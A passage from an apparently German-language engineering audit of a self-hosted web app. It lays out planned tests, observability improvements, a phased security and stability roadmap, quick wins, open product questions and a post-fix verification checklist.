- `ConfirmDialog` Doppelklick Unit: zwei schnelle Confirms → 1 Mutation (`ModalDialog.tsx`; U-014,
  Muster `negative.spec.ts:50`).
- Crash-Report Redaction Unit: E-Mail/Pfad geschwaerzt vor `createCrashNotification`
  (`crashReport.ts`, `main.tsx:52-63`; Q-004/S-014).
- Backend 403-Matrix: Non-Admin Restart/Update/Account-Switch/T3-Channel → 403, Datei unveraendert
  (S-001–S-003). Spoof-Test (S-006). `sanitizeName`-Matrix (S-010). Register-/Update-/Reserve-
  Parallel-Tests (D-010/D-004/D-008). Legacy-Konflikt-Signal (D-005).

### Vor wichtigen Refactorings erforderlich

- E2E Preview-Quarantaene (`beginPreviewSlotReset`→`verify`→quarantined → Diagnose + Retry;
  `LocalPreviewRuntime`, `PreviewDiagnosticsSheet`).
- E2E Backend-500 Dashboard/PreviewHub (Analogon `negative.spec.ts:76`).
- E2E ungueltige Deep-Links (`?preview`/`?note`/404; U-011).
- Unit `QueryBoundary` „Keine Daten" + `requestId` (`QueryBoundary.tsx`, `transport.ts`).
- Tastatur-Smoke: Skip-Link → Trap → Escape→Ruecksprung (Vorlage `PreviewTargetMenu.test.tsx:59`).
- Zwei-Client Orbit-Konflikt + Guard-Property (A-007). Notes-409-Flow (D-004).
- Query-Count vorher/nachher (D-006, 50 Sessions; 10 parallel, keine Busy-409).
- `toApiError`-Matrix: jede Klasse → Status+`code`+`retryable` (D-013).
- `sync/status`-Fehler-Sichtbarkeit (D-014). Restart-Key/Rotation/Stale (D-015).
- Bundle-Budget-Regression (P-002). Poll-Dedup 2 Tabs (P-004). RenderCount/Drag-Profil (P-005/P-006).
- FTS-Seed 5k (P-012/D-003). Revisions-Groessen-Assert (P-011). Boot-Tests defektes Verzeichnis/DB (A-002).
- DB-Empty-Tests (A-015). Socket-Verlust/Symlink-Race (A-014). Kollisions-/Rollback-Tests (A-008).
- Cache-Matrix + HTML-Fixture (A-011). T3-Smoke beide Kanaele + Backup-Existenz (A-012).
- Zwei-Identitaeten-Test (S-004/A-013). Fremd-Slot-Test + Cookie-Block (S-005). Rebinding-/Redirect-
  Tests (S-012). Push-Orakel-/Maskierungs-Tests (S-015). Upload-Matrix (S-010). CWD-/Config-Write-
  Tests (S-011). Bestaetigungs-Tests Preview-Befehl (S-013). Redaction-Tests Report/Logs (S-014).

### Vor einem Produktionsrelease erforderlich

- Playwright 390 px Orbit-Lifecycle (Analogon Notes; kein H-Overflow; U-007).
- Axe-Scans (`@axe-core/playwright`): Dashboard, Usage, Settings-System, PreviewHub, Orbit, Dialog
  offen (U-001/U-015 schließen).
- Offline-Matrix: Notes (vorhanden) + Orbit + Terminal-Reload (Q-003; Prinzip klaeren).
- Cross-Browser-Smoke (Chromium + Firefox + WebKit): Modal/iframe/Sidebar; Short-Height-Viewport.
- Last-Test Logs 5k (Fensterung; U-008). Lasttest 10 parallele Saves + Poll (0×500; P-010).
- Restart-Simulation: 10 Tabs → 0×429, Erkennung ≤5 s (P-017). Burst 30 Reports/60 s → 429 (S-009).
- Downtime-/Smoke-Gate: p95 <10 s, 0 Starts ohne Smoke (B-006). Health-Header-Assert (S-008).
- Build-Assert kein `MISTRAL` in `dist` (B-002). Lizenz-/Depcheck-Warnung (B-003).

### Langfristig sinnvoll

- Property/Fuzz: Orbit-Migration (korrupt), Notes-Frontmatter, `safeHermesPath`/`previewSlotUrl`,
  Destruktiv-Guard-Properties.
- Race: zwei Tabs gleiche Revision, Reconnect-Sturm, Restart-Doppelklick zwei Tabs.
- Migration/Import-Export: Roundtrip, beschaedigte `localStorage`-Stores
  (`migrateLegacyBrowserStorage` korrupt), v1-Drop, Timestamp-Helper.
- Security: iframe-`referrerPolicy`/`allow`-Audit, `window.open`-Opener (`opener=null` vorhanden —
  Tests ergaenzen), keine Secrets in `sessionStorage`.
- Recovery: `localStorage` voll/blockiert → Start trotzdem (Muster `main.tsx:24-27` ausweiten);
  Outbox-Flush-Limit; Backup-Restore-Dril.
- A11y-Screenreader-Smoke je Flaeche; Tastatur-Durchgang je Release.
- Last/Skalierung: 5k-Notes, 600-Node-Canvas-Bench, 2k-Notifications-Presence, 200-Revisionen-State.

Konkrete Dateien/Routen/Flows je Test in Abschnitt 4 („Tests") — dort die Checkliste abhaken.

## 12. Observability and Debugging

Bewertung: Logger-Redaction + Hermes-Redaction + Preview-HMAC-Pseudonym + Audit-Hashkette/Outbox
+ Breadcrumb-Ring/Dedup + Health-Panels vorhanden (gut). Luecken: Level/Korrelation/Metriken/
Alarmierung/Audit-Scope/PII (D-014, S-014, Q-004, B-008).

1. **Strukturierte Logs:** `redactText`-zentral (Muster token|secret|password|api-key) vor Persistenz
   (Report, DevServer-Logs, Diagnose-Events; S-014). Keine Klartext-Secrets in DB/Logs/Backups.
2. **Log-Level:** `addBreadcrumb({level,...})` statt Strings (Q-004); Backend-`catch`-Stellen mit
   `warn` + Zaehler (D-014); Over-Redaction vermeiden (Allowlist).
3. **Korrelations-IDs:** Backend-`x-request-id` in UI anzeigen (Boundary/Toast) + in Breadcrumb
   (Q-004); Audit-Eintraege mit Actor-Hash (S-001–S-003).
4. **Fehlertracking:** Schwere-Stufen (Dialog nur ohne Boundary; Toast fuer Hintergrund; Q-002);
   Aggregation statt Einzel-Dialog (Q-004); `lastError`-pro-Zweig in `sync/status` (D-014);
   Poller-Fehler als Diagnose-Kachel (A-013).
5. **Performance-Metriken:** p95 statt nur live (B-008); Slow-Query-Log 200 ms ohne PII; Bundle-Report
   als CI-Artefakt; LCP/CLS/RenderCount-Budgets (P-Abschnitt).
6. **Datenbankmetriken:** Busy-Rate, `freelist_count`, Tabellen-Groessen (`dbstat`), Revisions-Count,
   aktive-Notifications-Count, Snapshots-Count — mit Schwellen + Jobs (P-010/P-011/D-002).
7. **Health Checks:** `/readiness` ausbauen (DB `SELECT 1`, dist-mtime, tmux-Socket, T3-Port; B-006);
   Public-Health minimal (S-008); API-Down-Banner aus `health` (Q-004); Schema-Drift-Warnung (A-013).
8. **Audit Logs:** Scope erweitern (Terminal-Creates, Account-Switches, T3-Wechsel, Preview-Starts,
   WS-Session-Create; S-014); Retention-Job aus Request-Pfad (D-016); Verify-Cache/inkrementell.
9. **Alarmierung:** Degraded-Toast/Badge (Q-004); Restart-`failed`-Rate + Downtime (B-006);
   Kanalwechsel-Alert (S-003); Quota-/Cap-Warnungen (D-002/P-011).
10. **Schutz sensibler Daten:** Allowlist Report-`environment` (S-014); Account-Maskierung (S-015);
    Frontend-Redaction (Q-004); Backup-Hinweis (Secrets enthalten; S-015); Secret-Loesch-Flow
    (Revisionen/Backups; S-014).

## 13. Prioritized Roadmap

### Phase 0: Sofortmassnahmen (Sicherheit/Datenverlust/Produktion — Tage)

| ID | Titel | Prio | Abhaengigkeiten | Dateien | Schritte | Tests | Akzeptanz | Umfang | Risiko |
|---|---|---|---|---|---|---|---|---|---|
| B-001 | Mistral-Reste entfernen (Key deaktivieren, `.env`-Block + Doku-Reste raus) | P0 | — | `.env:20-29`, `docs/configuration.md`, Inventar-Plan | 1. Key deaktivieren 2. `.env`-Block loeschen 3. Doku/Inventar bereinigen 4. Grep-Assert | Grep-Assert, `systemctl show` ohne MISTRAL | kein `MISTRAL_*`/`NEWS_*` in `.env`/Code/Doku (ausser Historie) | S | Low |
| S-001 | Admin-Gate Restart/Update | P0 | — | `system/routes.ts`, `api/routes.ts` | Options durchreichen, Guards, Audit-Hash | 403/202-Matrix | Non-Admin blockiert | S | Low |
| S-002 | Admin-Gate Account-Switch | P0 | — | `usage/routes.ts` | Guards + Maskierung + Hinweis | 403/200-Matrix | nur Admins | S | Low |
| S-003 | Admin-Gate Config/T3-Kanal + Bestaetigung | P0 | S-001 | `system/routes.ts`, `t3ChannelService` | Guards + Doppel-Bestaetigung + Alert | 403-laesst-Datei; Backup-Test | wie S-001 + Backup | S | Low |
| S-008 | Health-CORS/Payload minimieren | P0 | — | `system/routes.ts` | Header weg, Payload teilen | Header-Assert | kein `*`/Leak | S | Low |
| S-010a | `sanitizeName` + Recheck (schnell) | P0 | — | `fileSystemHelpers.ts`, `fileManagerService.ts` | Reject-Regeln + Recheck | Upload-Matrix | kein Escape/Dotfile-still | S | Low |
| D-005a | Legacy-Konflikt-Signal | P0 | — | `orbit/database.ts`, Client | Flag + Hinweis | Legacy-Test | kein 200-ohne-Hinweis | S | Low |
| U-002a | Restart-Abbruch + Dirty-Confirm | P0 | — | `SystemRestartControls.tsx` | Cancel-UI + Dirty-Gate | Unit+E2E | Abbruch <1,5 s; Confirm | M | Low |

### Phase 1: Stabilisierung (Fehler/Daten/Regression — 2–4 Wochen)

D-004 (`expectedRevision` + 409), D-002 (Cap + Batch), D-009 (Read-seiteneffektfrei), D-010 (Upsert),
D-011 (Delete-Protokoll + Orphan-GC), D-013 (`toApiError`), D-014 (`lastError`), A-007-Konflikt-UI
+ Guard (mit D-005), A-009 (beide Contracts + Lock), D-015-Key/Rotation-Teil, P-011-Retention 100 +
VACUUM-Plan, P-010-Pragmas/Queue-Teil, Q-001 (Boundaries), Q-002-Stufen-Teil, U-003-Mapping-Teil,
U-013/U-014 (Schutz/Pending), Q-003-Sofort-Tests, U-002-Rest. Je Details/Akzeptanz Abschnitt 4/11.

### Phase 2: Security Hardening (Berechtigung/Validierung/Limits/Secrets/Header — 3–5 Wochen)

S-004 (Warnung + Skills-Gate + Scoping-Plan), S-005 (Gateway-Auth + Cookies + Budget), S-006
(Doku + IP-Fix + Strip-Pruefung + Token-Plan), S-007-CSP-Merge + Pinning/Warnung, S-009 (Limits +
Buckets), S-010-Rest (Dotfile-Policy + MIME), S-011 (Deny-Liste + Allowlist), S-012 (Lookup +
Policy), S-013 (Bestaetigungs-Flow), S-014 (Redaction + Audit-Scope), S-015 (Rotation + Maskierung),
A-010 (Inventar + Tests), B-002 (Prefix + Assert), B-005 (Env-Bereinigung), Q-004-Redaction/requestId.

### Phase 3: Performance (messbar — 3–6 Wochen)

P-004 (Poll-Hygiene), P-012/D-003 (FTS + Cursor), P-005/P-006 (Selektoren + Drag-Cache),
P-001/P-002/B-007 (Subset + Chunks + Budgets), P-007-Guard, P-003 (Dashboard-Split), P-008 (CLS),
P-009-Hub-Teil + Jitter, P-013 (TTL-Tuning), P-014-Caps, P-015-Async-IO, P-016-Default,
P-017-Backoff, D-006 (SQL-Suche), D-007 (Limits), D-008 (Tx), D-016 (Job-Auslagerung),
B-008 (Slow-Log + Artefakt). Je Messmethode/Ziel Abschnitt 4/7.

### Phase 4: Architektur/Wartbarkeit (gezielt — 4–8 Wochen)

A-001 (Split), A-002 (Phasen), A-003 (Accessor), A-005 (Single-Source), A-004-Schicht (mit D-006),
A-006-Splits (mit P-005), A-008-Trennung, A-011 (Hash-Version), A-012 (Selektor-Modul + Smoke),
A-013-Scoping, A-014-Probe, A-015-Regel + Rows, A-016-Sunset, D-012-Cursor, D-017-Rest,
B-003-Dedupe/lobehub, B-004-Kadenz.

### Phase 5: UX/Accessibility (Bedienung/mobil/A11y/Fehlerkommunikation — laufend)

U-001 (Kontrast), U-003-Rest, U-004 (Sheets), U-005 (Ziele), U-006 (iframe), U-007 (Orbit mobil +
390px-E2E), U-008 (Tooltip + Fenster), U-009 (CTAs), U-010 (Labels), U-011 (Banner), U-012
(Kontext-Persistenz), U-015 (Rollen/Traps/Tabellen), U-016-Tokenisierung, Q-002-Rest,
Offline-/Cross-Browser-Matrix (Q-003/11).

### Phase 6: Langfristig (optional/groesser)

Poll→Push, DB-Split/Postgres-Pfad, Objekt-Storage, Preview-Scheduler/Container, CDN,
T3/Hermes-Origin-Trennung, zweiter OS-User, Pro-Benutzer-Accounts, JSON-Patch, TTL-Capabilities,
B-006-Rollback-Vollausbau (dist-Retention + Smoke-Gate). Je Abschnitt 9.

## 14. Quick Wins (klein, hoher Nutzen, geringes Risiko)

1. B-001: `.env`-Mistral-Block loeschen + Key beim Anbieter deaktivieren — sofortige Critical-Reduktion, kein Code betroffen (kein Leser im Code).
2. S-001–S-003-Admin-Gates (je ~0,5 Tag) — groesste AuthZ-Luecken mit wenigen Zeilen.
3. S-008: `ACAO:*` entfernen + Health-Payload teilen — ein Diff, Orakel weg.
4. S-009-Teil: `POST /report` 10/min — ein Limit-Block.
5. S-010-Teil: `..`/Dotfile-Rejects + Recheck — wenige Zeilen.
6. S-006-Teil: `socket.remoteAddress`-Fix (`editorOpen`) — Einzeiler mit Test.
7. B-002: Vite-Prefix + Build-Assert — latenter Leak-Pfad zu.
8. A-009-Teil: beide Contracts im Restart-Skript — ein Build-Eintrag gegen falsche „succeeded".
9. A-005: Port-Generator/Test — eine Quelle.
10. D-010-Upsert, D-017-Einzeiler (FK-Flag, IMMEDIATE, Timeout, Konvention) — je Minuten.
11. P-011: Retention 500→100 (env vorhanden) — ein Default + Doku.
12. P-004-Teil: `refetchIntervalInBackground:false` + Logs 1,5→3 s — Config-Zeilen, halber Traffic.
13. P-017-Teil: Jitter-Einzeiler — Herd weg.
14. U-006: iframe-Titel + `ink-950`-Hintergrund — zwei Props.
15. U-009: Empty-CTAs — je ein Button.
16. U-013/U-014: Confirm/Undo + `confirmPending` — Muster kopieren.
17. U-010/U-012-Teil: Labels + URL-Filter — klein.
18. Q-002-Teil: „Keine Daten"-Retry — ein Button.
19. B-007-Teil: `exhaustive-deps` hochstufen (stores/views) — schleichende Deps sichtbar.
20. A-016-Teil: Sunset-Kopfkommentare + v1-Drop-Plan — Doku mit Wirkung.

## 15. Open Questions (Produktwissen/Entscheidungen noetig)

1. Ungelesene Notifications: verfallen (Cap ~500 pro `(source,kind)` + auto-`resolved`) oder
   „nie verlieren" als Versprechen? (D-002; blockiert Cap-Semantik.)
2. Notes-`update` revisionsgesichert (Contract-Bruch, Altdaten-Flow) akzeptabel? (D-004.)
3. Legacy-Orbit-Konflikt sichtbar (Antwort-Semantik) oder 200-Pflicht fuer Alt-Clients? Sunset-Datum?
   (D-005/A-007.)
4. `extensions.sqlite`-Trennung + `serialize()`-Snapshot als Backup-/Migrationsstory getestet? Wo liegt
   sie produktiv (keine Live-Datei gefunden)? (Backend-Audit.)
5. Orbit-Revisionen 500→100 + `VACUUM`-Fenster ok, oder 500 als Backup-Fenster noetig? (P-011.)
6. Retention `daily/model/project_usage`, `restart-logs`, `preview_repair_audit` (heute unbegrenzt)?
   (D-001/D-015.)
7. `GET /accounts` garantiert seiteneffektfrei (Saga → Boot/explizit)? (D-009.)
8. `projectKeyBasename`-Kollaps bekannt/akzeptiert? (D-001.)
9. Multi-User: offiziell unterstuetzt oder Single-User + Gaeste? (S-004/A-013; betrifft Verlauf,
   Push-Identitaeten, Orbit-Last-Wins.)
10. Legacy-Sunset-Termine (`saveLegacy`, `legacyPageRoutes`, `legacy-migration`, `npmExecutable`) +
    Nutzungs-Telemetrie? (A-007/A-016.)
11. Preview-Flag-Kombi produktiv freigegeben (`gatewayV2/bridge/diagnostics/storage/opt-in/slotReset`)?
    (A-004.)
12. Orbit-Konflikt: stilles Rebase + Backup als UX ok oder Block+Dialog? (A-007.)
13. Extension-Modell: Drafts + versionierte Extensions dauerhaft eine Registry oder getrennt? (A-008.)
14. Restart soll Extension-Contracts mitbauen (A-009) oder Absicht (schneller)? (A-009.)
15. Hermes/T3-Versionierung: getestete Commits/Kanaele? Wer bumpet `assetRewriteVersion`/sichert
    `state.sqlite` vor Downgrade? (A-011/A-012/S-003.)
16. Terminal-Persistenz: welche Typen ueberleben Reboot? Scrollback-Restore gewuenscht? (A-014.)
17. `data/restart-logs/` bewusst repo-lokal statt `dataDir` (Backup/Quota/Perm)? (A-009.)
18. 400-Zeilen-Allowlist aktiv abbauen (Owner+Ziel) oder nur Wachstum stoppen? (A-Architektur.)
19. Skalierungsziel: 10 (Haertung) oder 100 (Limit-Umbau + Push)? (P-Audit.)
20. `@lobehub/icons`-Ersatz als separater Design-Plan? (B-003.)
21. Crash-Report unredigiert oder PII-Schwaerzung vor Senden? (Q-004/S-014.)
22. Bottom-Sheet nur Preview-Diagnose oder alle `ModalFrame`? (U-004.)
23. Offline ueber Notes hinaus (Orbit/Terminal cachen) oder „Reload muss scheitern" als Prinzip? (Q-Frage.)
24. Release-Browser ausser Chromium (Firefox/WebKit-Matrix)? (Q-003.)
25. Notiz-/Orbit-Paletten Theme-Ausnahmen oder voll in `@theme`? (U-016.)
26. `preview_sessions_v1/*_v1` droppen? (D-017.2.)
27. `createAccount.profilePath`-Root-Policy? (S-Cross.)
28. Secret-Loesch-Flow (Revisionen/Backups prunen) oder Doku „manuell loeschen"? (S-014.)

Jede Frage nennt Warum + Abhaengigkeit — ohne Antwort nur Doku-Fallback (kein stiller Bruch).

## 16. Verification Checklist (nach Umsetzung)

1. [ ] Alle Critical/High (B-001, S-001–S-007, D-001/D-002/D-004–D-006/D-009, P-001/P-002/P-004/P-005/
       P-007/P-010–P-012, A-001/A-002/A-004/A-006/A-007/A-010, U-002/U-003, Q-001/Q-003, B-006)
       behoben oder mit Ticket + Datum + Mitigation versehen.
2. [ ] Keine Regressionen: `pnpm typecheck` gruen, `eslint --max-warnings=0`, `pnpm test`,
   `pnpm build`, E2E (Notes/Orbit-Lifecycle, 500-Retry, 390px-Notes, Back-nach-Loeschen) gruen.
3. [ ] Sicherheitspruefungen: 403-Matrix (Non-Admin), Spoof-Test, Fremd-Slot-Test, Upload-Matrix,
   Rebinding-/Redirect-Tests, Header-Assert, Build-Secret-Assert, `pnpm security:audit` (0 high).
4. [ ] Migrationen sicher: Reihenfolge-Doku, Up/Down-Pfad, Backup-Verifikation, Kill-Tests
   (Orbit-Migration, Asset-Delete, Workspace-Reserve, Register-Upsert, Notes-409).
5. [ ] Performance nicht schlechter: Bundle-Budgets, LCP/CLS, Poll-/WS-Counts, p95 (Save/Dashboard/
   Ports/Search), Busy-Rate 0/10 Tabs, Slow-Query 0/Tag, freelist <10 %.
6. [ ] Mobile Nutzung: 390px-Orbit-Lifecycle, Bottom-Sheets, 44-px-Ziele, kein H-Overflow,
   Short-Height-Viewport, Touch-Emulation + Tabwalk.
7. [ ] Berechtigungen: Zwei-Identitaeten-Test (kein Fremdzugriff), Skills/Admin-Gates, Push ohne
   Orakel, Accounts maskiert, Verlauf gescopet oder Warnung.
8. [ ] Fehlerzustaende sauber: Boundary-Loop-Test, Hintergrund-500-Toast, „Keine Daten"-Retry,
   Quarantaene-Flow, Restart-Abbruch/Timeout/Failed-Pfade, Konflikt-409-Flows (Notes/Orbit),
   Deep-Link-Banner.
9. [ ] Tests zuverlaessig: kritische Flows je ≥1 automatisierter Test (Restart, Quarantaene,
   Terminal-tot, Dialog-Trap, Account-Switch, Kanalwechsel, Preview-Start); keine flaky E2E
   (Jitter statt feste Sleeps).
10. [ ] Deployment/Rollback: Smoke-Gate, dist-Retention, Readiness-Ausbau, Downtime p95 <10 s,
    Log-Rotation aktiv, Restart-Key-Idempotenz, Lock-Stale-Test.




